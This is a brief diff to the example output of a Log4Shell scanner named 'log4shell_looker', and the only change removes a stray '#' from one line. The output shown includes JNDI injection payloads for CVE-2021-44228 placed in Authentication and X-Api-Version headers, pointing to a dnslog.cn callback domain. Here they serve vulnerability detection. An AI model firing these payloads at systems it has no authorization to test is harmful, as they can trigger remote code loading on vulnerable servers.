@@ -23,7 +23,7 @@ $ log4shell_looker http://127.0.0.1:8080/
 [***] Payload :  Authentication:${jndi:ldap://rfcbd0.dnslog.cn/}
 [---] Isn't to vulnerability CVE-2021-44228
 #################### 3 ############################
-# [+++] Your domain generated :  rfcbd0.dnslog.cn
+[+++] Your domain generated :  rfcbd0.dnslog.cn
 [+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
 [***] Payload :  X-Api-Version:${jndi:ldap://rfcbd0.dnslog.cn/}
 [***] DNS log result :  [["rfcbd0.dnslog.cn","172.253.238.4","2021-12-16 14:45:19"]]
